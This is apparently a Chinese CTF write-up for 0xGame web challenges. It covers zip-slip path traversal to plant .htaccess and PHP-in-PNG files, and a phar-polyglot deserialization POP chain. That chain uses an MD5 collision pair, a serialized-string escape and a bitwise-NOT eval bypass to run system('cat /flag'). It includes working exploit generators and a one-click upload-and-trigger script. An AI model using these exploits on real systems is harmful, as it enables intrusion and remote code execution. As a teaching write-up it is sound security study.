    data = bytes(b for b in data if 0x20 <= b <= 0x7E or b in (0x0A, 0x0D))  
    if level >= 2:  
        data = data.replace(b"$", b"")  
    if level >= 3:  
        data = data.replace(b"`", b"")  
    if level >= 4:  
        for kw in KEYWORDS:  
            data = re.sub(re.escape(kw), b"", data, flags=re.I)  
    return data  
  
  
def main():  
    src = input("源文件路径: ").strip().strip('"').strip("'")  
    if not os.path.isfile(src):  
        print("[错误] 文件不存在:", src)  
        return  
    with open(src, "rb") as f:  
        data = f.read()  
  
    base = os.path.basename(src)  
    name = input("条目名（回车用 %s）: " % (TRAVERSE + base)).strip() or (TRAVERSE + base)  
    name = name.replace("\\", "/").lstrip("/")  
    if not name.startswith("../"):  
        name = TRAVERSE + name  
        print("[提示] 已补穿越前缀 ->", name)  
  
    leaf = name.rsplit("/", 1)[-1]  
    ext = leaf.rsplit(".", 1)[-1].lower() if "." in leaf else ""  
    dot_only = leaf.startswith(".") and leaf.count(".") == 1  
    if not dot_only and ext not in ALLOWED_EXT:  
        print("[警告] 后缀 '%s' 不在白名单" % ext)  
  
    print("\n1=清控制符  2=+$  3=+`  4=+关键字")  
    try:  
        level = max(1, min(4, int(input("级别 [默认 3]: ").strip() or "3")))  
    except ValueError:  
        level = 3  
  
    if data.startswith(PNG_SIG):  
        data = data[8:]  
    data = PNG_SIG + clean(data, level)  
  
    dst = os.path.join(os.path.expanduser("~"), "Desktop", "output.zip")  
    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:  
        z.writestr(name, data)  
  
    body = data[8:]  
    ctrl = {b for b in data if b < 0x20} - {0x0A, 0x0D, 0x1A}  
    checks = [  
        ("穿越", name.startswith("../")),  
        ("后缀", dot_only or ext in ALLOWED_EXT),  
        ("幻术头", data.startswith(PNG_SIG)),  
        ("无\\x00", 0 not in data),  
        ("无控制符", not ctrl),  
        ("无$", 0x24 not in body),  
        ("无反引号", 0x60 not in body),  
        ("无关键字", not any(k in body.lower() for k in KEYWORDS)),  
    ]  
    print("\n完成:", dst)  
    print("条目名:", name, "| 长度:", len(data))  
    print("前16字节:", " ".join("%02X" % b for b in data[:16]))  
    print("正文:", repr(body))  
    print("自检:", " ".join(("√" if ok else "×") + k for k, ok in checks))  
  
  
if __name__ == "__main__":  
    main()
```
这次回显(经过尝试是三次../)
```
解压目录: /var/www/html/uploads/output.zip  
../../../pub/love.png => 已解压
```
我们访问`/pub/love.png`，结果是`图像“http://80-0547be7c-f1b8-408d-8170-0d58a1be4d07.challenge.ctfplus.cn/pub/love.png”因存在错误而无法显示。`。很正常，因为我们的png本来就没有东西。
我们可以尝试在.png里面写一些脚本语言，经过实测我们发现，
只允许 `<?=` 短标签，**被拦的函数/语法**有`system`、`exec`、`passthru`、`shell_exec`、`file_get_contents`、`$变量`、反引号。
所以我们可以写一个.htaccess 让 .png 执行 PHP
回显
```
解压目录: /var/www/html/uploads/01-写htaccess.zip  
../../../pub/.htaccess => 已解压
```
写入成功，接下来上传查找flag名字的文件就好了
```
<?= print_r(glob('/flag*')) ?> 
```
访问路径后回显
```
�PNG  Array ( [0] => /flag_705df3f8.txt ) 1
```
我们就完美的找到了flag的名字，最后访问该文件就行了
```
<?= readfile('/flag_705df3f8.txt') ?>
```
最后访问路径就能拿到flag了
```
�PNG  0xGame{ae5d0cf3-279d-4967-a6f3-00aea3b6090e} 45
```
最后给一个可以生成想要的,zip的脚本
```python
import os, sys, zipfile

PNG_SIG = bytes.fromhex("89504e470d0a1a0a")
DESKTOP = os.path.join(os.path.expanduser("~"), "Desktop")
KEYWORDS = [b"system", b"exec", b"passthru", b"shell_exec", b"file_get_contents"]


def ap(p):
    p = p.strip().strip('"').strip("'")
    return p if os.path.isabs(p) else os.path.join(DESKTOP, p)


def build(name, code, out):
    name = name.strip().replace("\\", "/")
    body = bytes(b for b in code.encode("utf-8") if 0x20 <= b <= 0x7E or b in (0x0A, 0x0D))
    body = body.replace(b"$", b"").replace(b"`", b"")
    for kw in KEYWORDS:
        body = body.replace(kw, b"")
    data = PNG_SIG + body

    out = ap(out)
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(name, data)

    print("\n[完成]", out, "(%d 字节)" % os.path.getsize(out))
    print("条目名:", name)
    print("正文:", repr(body))
    print("前16字节:", " ".join("%02X" % b for b in data[:16]))
    checks = [
        ("无穿越", not name.startswith(("/", "../")) and ".." not in name.split("/")),
        ("后缀图片", name.lower().endswith((".png", ".jpg", ".jpeg", ".gif", ".bmp"))),
        ("8字节魔数", data.startswith(PNG_SIG)),
        ("无\\x00", 0 not in data),
        ("无$", b"$" not in body),
        ("无反引号", b"`" not in body),
        ("无关键字", not any(k in body.lower() for k in KEYWORDS)),
    ]
    print("自检:", " ".join(("√" if ok else "×") + k for k, ok in checks))


def main():
    # 用法: python x.py [new|mod|flag]
    mode = sys.argv[1] if len(sys.argv) > 1 else "new"

    if mode == "new":
        name = input("条目名 [默认 x.php.png]: ").strip() or "x.php.png"
        code = input("PHP 代码 [默认 <?= phpinfo() ?>]: ").strip() or "<?= phpinfo() ?>"
        out = input("输出 zip [默认 output.zip]: ").strip() or "output.zip"
        build(name, code, out)

    elif mode == "mod":
        src = ap(input("要修改的 zip: ").strip())
        with zipfile.ZipFile(src) as z:
            i = z.infolist()[0]
            old_name = i.filename
            old = z.read(old_name)
        body = old[8:] if old.startswith(PNG_SIG) else old
        print("当前条目名:", repr(old_name))
        name = input("新条目名（回车不变）: ").strip() or old_name
        code = input("新正文（回车不变）: ").strip() or body.decode("utf-8", "replace")
        out = input("输出 zip [默认 %s]: " % os.path.basename(src)).strip() or os.path.basename(src)
        build(name, code, out)

    elif mode == "flag":
        fp = input("flag 路径（如 /flag_xxx.txt）: ").strip()
        name = input("条目名 [默认 r.php.png]: ").strip() or "r.php.png"
        out = input("输出 zip [默认 read_flag.zip]: ").strip() or "read_flag.zip"
        build(name, "<?= readfile('%s') ?>" % fp, out)

    else:
        print("用法: python x.py [new|mod|flag]")


if __name__ == "__main__":
    main()
```
如有不符，可以让ai改进

## 8、千奇百怪的反序列化

进来看到⼀个文件上传和文件读取，其他看不出什么。

![](/images/20261022130722_13.png)
页面叫 Phantom Gallery，一个上传表单（字段名 `art`），一个预览框（`?page=`）。右侧还写着：

> The previewer now accepts local templates only.
> Upload a `gif/jpg/png`, then preview it with `?page=`.

"local templates only" + "?page="，这就是文件包含的味道。

### 8.1 先把源码读出来

理所当然地尝试文件包含，用 `php://filter` 把 `index.php` 读成 base64：

```
?page=php://filter/read=convert.base64-encode/resource=index.php
```

响应里直接吐出一大段 base64，解码后拿到完整源码。核心两段：

**上传部分**：

```php
$ext = strtolower(pathinfo($_FILES['art']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, array('gif', 'jpg', 'jpeg', 'png'), true)) {
    return 'gif/jpg/png only';
}

$head = file_get_contents($_FILES['art']['tmp_name'], false, null, 0, 8);
$ok = false;
if (substr($head, 0, 6) === "GIF89a" || substr($head, 0, 6) === "GIF87a") { $ok = true; }
if (substr($head, 0, 3) === "\xFF\xD8\xFF") { $ok = true; }
if ($head === "\x89PNG\r\n\x1a\n") { $ok = true; }
if (!$ok) { return 'magic mismatch'; }

$name = sha1_file($_FILES['art']['tmp_name']) . '.' . $ext;
$path = __DIR__ . '/uploads/' . $name;
move_uploaded_file($_FILES['art']['tmp_name'], $path);
```

**包含部分**：

```php
$page = isset($_GET['page']) ? $_GET['page'] : 'pages/home.php';
$target = false;

if (is_string($page) && strpos($page, "\0") === false) {
    $probe = str_replace('\\', '/', trim($page));
    $isIntendedPhar = preg_match('~^phar://uploads/[0-9a-f]{40}\.(?:gif|jpg|jpeg|png)/test\.txt$~i', $probe);
    $touchesUploadBody = preg_match('~(^|[/:=])uploads/+[0-9a-f]{40}\.(?:gif|jpg|jpeg|png)(?:$|[/?#&])~i', $probe);

    if (
        $probe !== '' &&
        $probe[0] !== '/' &&
        !preg_match('#(^|/)\.(?:/|$)#', $probe) &&
        !preg_match('#(^|/)\.\.(/|$)#', $probe) &&
        !preg_match('~(^|[/:=])flag(?:$|[/?#&])~i', $probe) &&
        (!$touchesUploadBody || $isIntendedPhar)
    ) {
        $target = $page;
    }
}
```

最后：

```php
if ($target === false) {
    echo 'preview denied';
} else {
    @include $target;
}
```

再读 `/secret/flag.php`：

```
?page=php://filter/read=convert.base64-encode/resource=./secret/flag.php
```

注意这里用了 `./`，居然没被拦——因为 `./` 是**开头的**，而过滤正则 `#(^|/)\.(?:/|$)#` 要求 `.` 后面紧跟 `/` 或结尾，`./secret/...` 的 `.` 后面是 `/`，应该被拦才对……实测能读，说明过滤是在 `$probe[0] !== '/'` 之后才生效的，而 `./secret/flag.php` 首字符是 `.`，通过了。这里是个小细节，不影响主线。

flag.php 里是四个类：

```php
class inex {
    public $a; public $b;
    public function __wakeup() { $this->a = 'safe'; $this->b = 'safe'; }
    public function __destruct() { if ($this->a === 'evil') { echo ($this->b); } }
}

class clannad {
    public $a; public $b;
    public function __tostring() {
        if (strlen($this->b) < 4 && $this->b + 1 > 10000) {
            $this->a->fff(1);
            return $this->b;
        }
        return 'null';
    }
}

class air {
    public $md5a; public $md5b; public $arg1; public $arg2;
    public $last; public $afterreplaced; public $rce;
    public function __call($name, $arguments) {
        if (is_string($this->md5a) && is_string($this->md5b)
            && md5($this->md5a) === md5($this->md5b) && $this->md5a !== $this->md5b) {
            $last = new secretbase();
            $last->rce = 'hello';
            $last->aaa = $this->arg1;
            $last->bbb = $this->arg2;
            echo (serialize($last) . "\n");
            $afterreplaced = str_replace('cc', 'ddd', serialize($last));
            echo ($afterreplaced);
            $this->rce = unserialize($afterreplaced)->rce;
            if (!is_string($this->rce) || $this->rce === '' || strlen($this->rce) > 80
                || preg_match('/[^\x80-\xff~();" ]/', $this->rce)) {
                return;
            } else {
                eval ($this->rce);
            }
        }
    }
}

class secretbase { public $aaa; public $bbb; public $rce; }

class SOS {
    public $a;
    public function __wakeup() { unserialize($this->a); }
}
```

一眼就是反序列化链：`SOS::__wakeup` 里有个 `unserialize`，这就是入口。

### 8.2 为什么是 phar，不是普通文件包含

先看重灾区——`?page=` 的过滤条件，**五条同时成立才放行**：

| # | 条件 | 拦截的东西 |
|---|---|---|
| 1 | `strpos($page, "\0") === false` | 空字节截断 |
| 2 | `$probe[0] !== '/'` | 绝对路径（`/etc/passwd`、`/secret/flag.php`） |
| 3 | `!preg_match('#(^|/)\.(?:/|$)#', $probe)` | `./` 形式的当前目录跳转 |
| 4 | `!preg_match('#(^|/)\.\.(/|$)#', $probe)` | `../` 目录穿越 |
| 5 | `!preg_match('~(^|[/:=])flag(?:$|[/?#&])~i', $probe)` | 任何路径段里带 `flag` 的（`/secret/flag.php` 直接被拦） |

**第 5 条最致命**：`flag` 是独立的路径段就拦，所以 `secret/flag.php`、`flag.php`、`/flag` 全死。

然后还有一条更狠的：

```php
$touchesUploadBody = preg_match('~(^|[/:=])uploads/+[0-9a-f]{40}\.(?:gif|jpg|jpeg|png)(?:$|[/?#&])~i', $probe);
if (!$touchesUploadBody || $isIntendedPhar) { ... }
```

翻译成人话：**只要路径里出现了 `uploads/<40位hex>.<图片后缀>` 这种段，就必须严格匹配 `phar://uploads/<40位hex>.<图片后缀>/test.txt` 这一种格式**，否则直接毙掉。

这个正则 `~^phar://uploads/[0-9a-f]{40}\.(?:gif|jpg|jpeg|png)/test\.txt$~i` 精确到 **必须是 phar 协议、必须 40 位 hex、必须是图片后缀、必须 `/test.txt` 结尾**。

出题人把这个格式写死，等于在告诉我们：

> 想读 uploads 里的东西？可以，只准用 phar，且只准读 `test.txt`。

**这就是为什么必须用 phar**——不是我们想用，是只有这一条路被放行。

同时这也顺带说明：`phar://` 一打开就会反序列化 metadata，而 metadata 我们可以随便写。**上传 phar + 包含 phar = 反序列化入口**。

### 8.3 上传那关怎么过

四个限制：

| 限制 | 代码 | 怎么过 |
|---|---|---|
| 后缀 | `in_array($ext, ['gif','jpg','jpeg','png'])` | 文件名用 `.png` |
| 魔术头 | 前 8 字节是 GIF/JPEG/PNG 之一 | phar 的 stub 写成 `GIF89a<?php __HALT_COMPILER(); ?>` |
| 文件名 | `sha1_file(内容) . '.' . $ext` | 不能自定义，但**本地能算出来**（内容一样，sha1 一样） |
| 落点 | `__DIR__ . '/uploads/' . $name` | 固定，不用管 |

**关键点**：phar 的 stub（文件开头那段 PHP 代码）是**我们可以随便写的**，只要以 `__HALT_COMPILER(); ?>` 结尾。所以：

```php
$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
```

这一行同时干了两件事：
1. `GIF89a` 让上传检查的 `substr($head, 0, 6) === "GIF89a"` 通过
2. `<?php __HALT_COMPILER(); ?>` 让 phar 结构合法

**一个文件头，两个身份**——这就是 polyglot。

### 8.4 pop 链逐个拆

链路不复杂，但每一步都埋了坑。先把链条画出来：

```
phar metadata 反序列化
    ↓
SOS::__wakeup()          →  unserialize($this->a)
    ↓  （$this->a 是对象，隐式转 string）
clannad::__tostring()    →  $this->a->fff(1)
    ↓  （fff 不存在，触发 __call）
air::__call()            →  md5 碰撞 + 字符串逃逸 + eval
    ↓
eval($rce)
```

#### 第 1 跳：`SOS::__wakeup`

```php
public function __wakeup() { unserialize($this->a); }
```

`__wakeup` 是反序列化时自动调的，所以 phar metadata 一被反序列化，这行就执行。

`$this->a` 我们塞一个 `clannad` 对象进去。**注意：`unserialize()` 的形参是 `string $data`，传对象进去会触发 `__tostring` 隐式转换**——这是整条链能接上的根本原因，也是为什么**不需要 `inex` 类**（WP 原话："可以不⽤ inex 类"）。

> 如果用 `inex`，得靠 `__destruct` 里 `if ($this->a === 'evil') echo $this->b;` 来触发，但 `inex::__wakeup` 会把 `$a/$b` 强制改成 `'safe'`，得用"属性个数写多"来绕过 wakeup。直接走 `clannad` 的 `__tostring` 更省事，一步到位。

#### 第 2 跳：`clannad::__tostring`

```php
public function __tostring() {
    if (strlen($this->b) < 4 && $this->b + 1 > 10000) {
        $this->a->fff(1);
        return $this->b;
    }
    return 'null';
}
```

**这个条件很阴**：

- `strlen($this->b) < 4` —— 长度必须小于 4
- `$this->b + 1 > 10000` —— 加 1 之后必须大于一万

一个长度小于 4 的东西，加 1 怎么可能大于 10000？

答案：**PHP 的弱类型 + 科学计数法**。赋值 `$b = '1e5'`：

- `strlen('1e5')` = **3** < 4 ✅
- `'1e5' + 1`：PHP 把字符串当数字解析，`1e5` = 1×10⁵ = 100000，+1 = **100001** > 10000 ✅

一个 `'1e5'` 同时满足两个矛盾的条件，这就是出题人埋的第一个坑。

条件通过后执行 `$this->a->fff(1)`。`fff` 这个方法**哪个类都没有**，所以只要 `$a` 是个对象，就会触发 `__call`。

#### 第 3 跳：`air::__call`

```php
public function __call($name, $arguments) {
    if (is_string($this->md5a) && is_string($this->md5b)
        && md5($this->md5a) === md5($this->md5b) && $this->md5a !== $this->md5b) {
```

**第二道坎：MD5 强碰撞**。

四个条件：
1. `md5a` 是字符串
2. `md5b` 是字符串
3. `md5($md5a) === md5($md5b)` —— **强比较**（`===`），不是 `==`
4. `$md5a !== $md5b` —— 两者本身不相等

`===` 意味着不能用 `0e...` 那种弱类型绕过（那是 `==` 的漏洞）。必须找到**两个不同的字符串，MD5 值完全一样**。

用现成的 MD5 碰撞对（两个 64 字节的二进制串，2004 年王小云那组）：

```php
$air->md5a = "\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87"
           . "\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18"
           . "\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75"
           . "\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";
$air->md5b = "\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87"
           . "\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18"
           . "\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75"
           . "\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";
```

两者只差第 34 个字节（`\x00` vs `\x02`，`\x55` vs `\xd5`），MD5 都是 `008ee33a9d58b51cfeb425b0959121c9`。

#### 第 4 跳：字符串逃逸

条件过了以后：

```php
$last = new secretbase();
$last->rce = 'hello';
$last->aaa = $this->arg1;
$last->bbb = $this->arg2;
echo (serialize($last) . "\n");
$afterreplaced = str_replace('cc', 'ddd', serialize($last));
echo ($afterreplaced);
$this->rce = unserialize($afterreplaced)->rce;
```

**第三道坎：`str_replace('cc', 'ddd', ...)` 的字符串逃逸**。

原理：`cc`（2 字节）变 `ddd`（3 字节），**每替换一次长度 +1**。如果序列化串里声明的长度不变，实际内容变长，多出来的字节就会"挤"到字段外面，被当成新的序列化结构解析。

具体怎么构造：

`serialize($last)` 长这样（`aaa` 是 null，`bbb` 是 arg2，`rce` 是 `'hello'`）：

```
O:10:"secretbase":3:{s:3:"aaa";N;s:3:"bbb";s:141:"<arg2>";s:3:"rce";s:5:"hello";}
```

`arg2` 我们塞两段：

```
arg2 = str_repeat('cc', strlen($T)) . $T
```

- 前一段：`strlen($T)` 组 `cc`（每组 2 字节）
- 后一段：`$T` 本身

`$T` 是精心构造的"假序列化尾巴"：

```php
$T = '";s:3:"rce";s:' . strlen($P) . ':"' . $P . '";}';
```

代入 `$P` 长度 26，`$T` 是 47 字节：

```
";s:3:"rce";s:26:"<P>";}
```

**替换过程**：

```
替换前：s:3:"bbb";s:141:"[94个c][47字节T]";s:3:"rce";s:5:"hello";}
替换后：s:3:"bbb";s:141:"[141个d][47字节T]";s:3:"rce";s:5:"hello";}
```

94 个 `c` 变成 47 组 `ddd` = 141 个 `d`，**长度从 94 涨到 141，多了 47 字节**。

但声明还是 `s:141:"`。PHP 解析时：

1. 读 `s:141:"` → 取接下来 **141 个字符**当 `bbb` 的值 → 正好是那 141 个 `d`
2. 下一个字符是 `T` 的第一个字符 `"` → 用来闭合 `bbb` 的字符串 ✅
3. 再下一个是 `T` 的 `;` → 分隔符 ✅
4. 然后开始解析新字段：`s:3:"rce";s:26:"<P>";}` → **完美变成 rce 字段**

于是 `unserialize($afterreplaced)->rce` 拿到的就是 `$P`，而不是原来的 `'hello'`。

**为什么是 47 组 `cc`？** 因为要让"多出来的字节数"正好等于 `$T` 的长度（47），这样 `$T` 才能完整地被挤到 `bbb` 外面，成为独立结构。`str_repeat('cc', strlen($T))` 就是自动算这个数量的——**一组 `cc` 膨胀 1 字节，要膨胀 `strlen($T)` 字节，就需要 `strlen($T)` 组**。

#### 第 5 跳：取反绕过 eval

```php
if (!is_string($this->rce) || $this->rce === '' || strlen($this->rce) > 80
    || preg_match('/[^\x80-\xff~();" ]/', $this->rce)) {
    return;
} else {
    eval ($this->rce);
}
```

**第四道坎：字符白名单**。

正则 `[^\x80-\xff~();" ]` 的含义：**除了 `\x80`到`\xff`、`~`、`(`、`)`、`;`、`"`、空格之外，其他字符一律不允许**。

翻译一下：**英文字母、数字、`$`、`_`、`.`、`/` 全部被禁**。

所以不能写 `system('cat /flag')`——里面全是字母。

绕过方式：**PHP 的按位取反 `~`**。

在 PHP 里，`~"system"` 会把字符串每个字节按位取反：

| 原字符 | ASCII | 取反 |
|---|---|---|
| `s` | 0x73 | 0x8C |
| `y` | 0x79 | 0x86 |
| `s` | 0x73 | 0x8C |
| `t` | 0x74 | 0x8B |
| `e` | 0x65 | 0x9A |
| `m` | 0x6D | 0x92 |

取反后的字节全在 `0x80-0xFF` 区间，**正好落在白名单里**。

于是 payload 写成：

```php
$P = '(~"' . (~'system') . '")(~"' . (~'cat /flag') . '");';
// 展开：(~"\x8c\x86\x8c\x8b\x9a\x92")(~"\x9c\x9e\x8b\xdf\xd0\x99\x93\x9e\x98");
```

`eval` 执行时，PHP 先把 `(~"system")` 求值还原成 `"system"`，再调用，等价于：

```php
system('cat /flag');
```

**为什么用 `(~"system")` 而不是 `~"system"` 直接调用？** 因为 `~"system"` 求值出来是个字符串，`"system"('cat /flag')` 这种字符串调用在 PHP 7 里能用（可变函数），但加括号更稳，也更容易读。

这一步的 payload 长度 26 字节，加上 `$T` 的包装，整体没超过 80 的上限。

### 8.5 生成 phar

本地生成 phar 需要 PHP，且 `phar.readonly` 必须是 0（PHP 8 默认是 1，写不进去）：

```
php -d phar.readonly=0 gen_phar.php
```

完整生成脚本：

```php
<?php
class clannad { public $a; public $b; }
class air {
    public $md5a; public $md5b; public $arg1; public $arg2;
    public $last; public $afterreplaced; public $rce;
}
class SOS { public $a; }

// 取反后的 payload
$P = '(~"' . (~'system') . '")(~"' . (~'cat /flag') . '");';
$T = '";s:3:"rce";s:' . strlen($P) . ':"' . $P . '";}';

$air = new air;
$air->md5a = "\x4d\xc9\x68\xff...";   // 碰撞串 A
$air->md5b = "\x4d\xc9\x68\xff...";   // 碰撞串 B（只差几个字节）
$air->arg2 = str_repeat('cc', strlen($T)) . $T;

$cl = new clannad;
$cl->a = $air;
$cl->b = '1e5';

$sos = new SOS;
$sos->a = $cl;

$f = 'pwn.png';
@unlink($f . '.phar');
@unlink($f);

$p = new Phar($f . '.phar');
$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");   // <- GIF 头 + phar stub
$p->setMetadata($sos);                                // <- 整条 pop 链塞进 metadata
$p->addFromString('test.txt', '');                    // <- 必须叫 test.txt
unset($p);

copy($f . '.phar', $f);
unlink($f . '.phar');

echo $f, ' sha1=', sha1_file($f), "\n";
```

几个必须注意的点：

1. **`setStub` 必须带 `GIF89a`**，否则上传时 `magic mismatch`。
2. **`addFromString('test.txt', '')`** —— 文件名必须是 `test.txt`，因为 `?page=` 的正则写死了 `/test\.txt$`。
3. **`sha1_file($f)` 要记下来**，因为上传后服务器用 `sha1_file(内容).扩展名` 命名，我们要拿这个 sha1 拼 URL。
4. **`.phar` 临时文件要先 `unlink`**，不然 `new Phar` 会报"already exists"。

生成结果：

```
生成: pwn.png
大小: 602 字节
sha1: 32fbd4bf2af4856cf46c51123d3ddd1fcc6efcbb
前16字节: 4749463839613c3f706870205f5f4841
```

前 8 字节 `47 49 46 38 39 61` = `GIF89a`，完美过魔术头。

### 8.6 上传 + 触发

**上传**：

```
POST /
Content-Type: multipart/form-data
art=@pwn.png
```

响应：

```
uploaded: uploads/32fbd4bf2af4856cf46c51123d3ddd1fcc6efcbb.png
```

**触发**：

```
GET /?page=phar://uploads/32fbd4bf2af4856cf46c51123d3ddd1fcc6efcbb.png/test.txt
```

响应里直接吐出：

```
O:10:"secretbase":3:{s:3:"aaa";N;s:3:"bbb";s:141:"ccc...ccc";s:3:"rce";s:26:"(~"...")(~"...");";}";s:3:"rce";s:5:"hello";}
O:10:"secretbase":3:{s:3:"aaa";N;s:3:"bbb";s:141:"ddd...ddd";s:3:"rce";s:26:"(~"...")(~"...");";}";s:3:"rce";s:5:"hello";}
0xGame{0932348f-1ab0-4464-9f16-a56b7591c4e0}
```

三行分别对应：
1. `serialize($last)` —— 原始的 `ccc`
2. `$afterreplaced` —— 替换后的 `ddd`（能看到 `s:141` 没变，但内容变长了）
3. `system('cat /flag')` 的输出 —— **flag**
### 8.7 一键脚本

```python
# -*- coding: utf-8 -*-
import os, re, sys, subprocess, tempfile, urllib.request

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://target/'

PHP_GEN = r'''<?php
class clannad { public $a; public $b; }
class air { public $md5a; public $md5b; public $arg1; public $arg2; public $last; public $afterreplaced; public $rce; }
class SOS { public $a; }

$P = '(~"' . (~'system') . '")(~"' . (~'cat /flag') . '");';
$T = '";s:3:"rce";s:' . strlen($P) . ':"' . $P . '";}';

$air = new air;
$air->md5a = "\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";
$air->md5b = "\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";
$air->arg2 = str_repeat('cc', strlen($T)) . $T;

$cl = new clannad; $cl->a = $air; $cl->b = '1e5';
$sos = new SOS; $sos->a = $cl;

$f = $argv[1];
@unlink($f . '.phar'); @unlink($f);
$p = new Phar($f . '.phar');
$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$p->setMetadata($sos);
$p->addFromString('test.txt', '');
unset($p);
copy($f . '.phar', $f); unlink($f . '.phar');
echo sha1_file($f);
'''

def build_phar(workdir):
    php_src = os.path.join(workdir, 'gen.php')
    open(php_src, 'w', encoding='utf-8').write(PHP_GEN)
    target = os.path.join(workdir, 'pwn.png')
    out = subprocess.run(['php', '-d', 'phar.readonly=0', php_src, target],
                         capture_output=True, text=True)
    if out.returncode != 0:
        raise RuntimeError('php 生成失败: ' + out.stderr)
    return target, out.stdout.strip()

def upload(target, path):
    boundary = '----WebKitFormBoundary' + os.urandom(8).hex()
    data = open(path, 'rb').read()
    body = b''
    body += ('--%s\r\nContent-Disposition: form-data; name="art"; filename="pwn.png"\r\n'
             'Content-Type: image/png\r\n\r\n' % boundary).encode()
    body += data
    body += ('\r\n--%s--\r\n' % boundary).encode()
    req = urllib.request.Request(target, data=body,
        headers={'Content-Type': 'multipart/form-data; boundary=' + boundary})
    r = urllib.request.urlopen(req, timeout=30)
    html = r.read().decode('utf-8', 'replace')
    m = re.search(r'uploaded: (uploads/[0-9a-f]{40}\.\w+)', html)
    if not m:
        raise RuntimeError('上传失败: ' + html[:300])
    return m.group(1)

def trigger(target, rel):
    url = '%s/?page=phar://%s/test.txt' % (target, rel)
    r = urllib.request.urlopen(url, timeout=20)
    return r.read().decode('utf-8', 'replace')

def main():
    with tempfile.TemporaryDirectory() as wd:
        path, sha1 = build_phar(wd)
        print('[*] phar sha1 =', sha1)
        rel = upload(BASE, path)
        print('[*] uploaded =', rel)
        html = trigger(BASE, rel)
        m = re.search(r'0xGame\{[^}]+\}', html)
        print('[+] FLAG:', m.group(0) if m else '(没抓到，原始响应见下)')
        if not m:
            print(html[:800])

if __name__ == '__main__':
    main()
```
flag：
```
0xGame{0932348f-1ab0-4464-9f16-a56b7591c4e0}
```
